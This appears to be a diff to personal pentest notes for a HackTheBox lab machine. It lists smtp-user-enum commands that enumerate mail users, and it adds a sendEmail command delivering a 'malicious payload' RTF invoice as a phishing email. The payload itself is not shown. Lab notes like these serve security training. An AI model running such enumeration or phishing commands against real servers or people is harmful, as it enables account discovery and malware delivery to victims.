@@ -20,3 +20,7 @@ RCPT TO:<jajajajaja@reel.htb>
 smtp-user-enum.pl -M VRFY -U test-users.txt -t <ip>
 smtp-user-enum.pl -M EXPN -U test-users.txt -t <ip>
 smtp-user-enum.pl -M RCPT -U test-users.txt -t <ip>
+
+
+#send email with malicious payload
+sendEmail -f publ1c@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s 10.10.10.77 -v 
